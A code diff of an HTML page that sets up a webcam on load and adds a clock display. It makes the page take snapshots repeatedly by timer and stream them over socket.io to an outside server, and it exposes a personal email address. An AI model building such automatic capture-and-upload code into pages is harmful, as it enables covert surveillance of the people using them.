@@ -4,106 +4,103 @@
 <script src="https://code.jquery.com/jquery-1.10.2.min.js"></script>
 <script src="/socket.io/socket.io.js"></script>
 <script src="webcam.min.js"></script>
-
 <div id="usersOnline">ini_div_usersOnline</div>
 <style>
 	#my_camera{
-	width: 320px;
-	height: 240px;
-	border: 1px solid black;
+		width: 320px;
+		height: 240px;
+		border: 1px solid black;
+	}
+body {
+    background: black;
+}
+
+.clock {
+    position: absolute;
+    top: 50%;
+    left: 50%;
+    transform: translateX(-50%) translateY(-50%);
+    color: #17D4FE;
+    font-size: 60px;
+    font-family: Orbitron;
+    letter-spacing: 7px;
+   
+
+
 }
 </style>
+<div id="my_camera" style="width: 320px; height: 240px;">
+<div></div>
+<video autoplay="autoplay" style="width: 320px; height: 240px;"></video></div>
+<div id="MyClockDisplay" class="clock" onload="showTime()"></div>
+<input type=button value="Configure" onClick="configure()">
+<input type=button value="Take Snapshot" onClick="take_snapshot()">
+<div id="results"></div>
+<script>
+	var socket = io.connect('https://rek.my.id:4436');
+	socket.on('broadcast',function(data) {
+			document.getElementById("usersOnline").innerText = data.description;
+	});
+	socket.on('connect', function(data) {
+			socket.emit('join', 'Bismillah|bekabeipa@gmail.com|hanyajasa.com|viewmode');
+	});
+	function showTime(){
+		//https://codepen.io/afarrar/pen/JRaEjP
+		var date = new Date();
+		var h = date.getHours(); // 0 - 23
+		var m = date.getMinutes(); // 0 - 59
+		var s = date.getSeconds(); // 0 - 59
+		var session = "AM";
+		
+		if(h == 0){
+			h = 12;
+		}
+		
+		if(h > 12){
+			h = h - 12;
+			session = "PM";
+		}
+		
+		h = (h < 10) ? "0" + h : h;
+		m = (m < 10) ? "0" + m : m;
+		s = (s < 10) ? "0" + s : s;
+		
+		var time = h + ":" + m + ":" + s + " " + session;
+		document.getElementById("MyClockDisplay").innerText = time;
+		document.getElementById("MyClockDisplay").textContent = time;
+		
+		setTimeout(showTime, 1000);
+		setTimeout(take_snapshot, 5000);
+	}
+	showTime();
+	configure();
 
-	<div id="my_camera"></div>
-	<input type=button value="Configure" onClick="configure()">
-	<input type=button value="Take Snapshot" onClick="take_snapshot()">
-	<input type=button value="Save Snapshot" onClick="saveSnap()">
-
-    <div id="results"></div>
-
-	<script>
-        var socket = io.connect('https://rek.my.id:4436');
-        socket.on('broadcast',function(data) {
-                document.getElementById("usersOnline").innerText = data.description;
-        });
-        socket.on('connect', function(data) {
-                socket.emit('join', 'Bismillah|bekabeipa@gmail.com|hanyajasa.com|viewmode');
-        });
-        /*socket.on('broadcasttakess', function(data) {
-                //Webcam.set({
-                        width: 320,
-                        height: 240,
-                        image_format: 'jpeg',
-                        jpeg_quality: 90
-                });
-                Webcam.attach('#my_camera');
-                document.addEventListener('click', take_snapshot());//
-                socket.emit('clientoserver',data_uri);
-		console.log('broadcasttakess get: ' + data);
-        });*/
-	
+	/*setTimeout(function(){
+		configure();
+		console.log('configure setTimeout 5 sec 1x');
 		setTimeout(function(){
-			//alert("After 5 seconds!");
 			take_snapshot();
 			console.log('take_snapshot setTimeout 5 sec 1x');
 		}, 5000);
+	}, 5000);*/
 
-		// Configure a few settings and attach camera
-		function configure(){
-			Webcam.set({
-				width: 320,
-				height: 240,
-				image_format: 'jpeg',
-				jpeg_quality: 90
-			});
-			Webcam.attach( '#my_camera' );
-		}
-		// A button for taking snaps
+	function configure(){
+		Webcam.set({
+			width: 320,
+			height: 240,
+			image_format: 'jpeg',
+			jpeg_quality: 90
+		});
+		Webcam.attach('#my_camera');
+	}
 
-		// preload shutter audio clip
-		var shutter = new Audio();
-		shutter.autoplay = false;
-		shutter.src = navigator.userAgent.match(/Firefox/) ? 'shutter.ogg' : 'shutter.mp3';
-
-		function take_snapshot() {
-			// play sound effect
-			//shutter.play();
-			// take snapshot and get image data
-			Webcam.snap( function(data_uri) {
-				// display results in page
-				document.getElementById('results').innerHTML = '<img id="imageprev" src="'+data_uri+'"/>';
-				socket.emit('clientoserver',data_uri);
-            });
-			Webcam.reset();
-		}
-function upload() {
-    console.log("Uploading...")
-    var image = document.getElementById('image').src;
-    var form = document.getElementById('myForm');
-    var formData = new FormData(form);
-    formData.append("file", image);
-    var xmlhttp = new XMLHttpRequest();
-    xmlhttp.open("POST", "/signup");
-    // check when state changes,
-    xmlhttp.onreadystatechange = function() {
-    if(xmlhttp.readyState == 4 && xmlhttp.status == 200) {
-        alert(xmlhttp.responseText);
-        }
-    }
-    xmlhttp.send(formData);
-    console.log(formData.get('file'));
-    console.log(formData.get('userID'));
-}
-		function saveSnap(){
-			// Get base64 value from <img id='imageprev'> source
-			var base64image =  document.getElementById("imageprev").src;
-
-			 Webcam.upload( base64image, 'upload.php', function(code, text) {
-				 console.log('Save successfully');
-				 console.log(text);
-            });
-
-		}
-	</script>
+	function take_snapshot() {
+		Webcam.snap( function(data_uri) {
+			document.getElementById('results').innerHTML = '<img id="imageprev" src="'+data_uri+'"/>';
+			socket.emit('clientoserver',data_uri);
+		});
+		//Webcam.reset();
+	}
+</script>
 </body>
 </html>
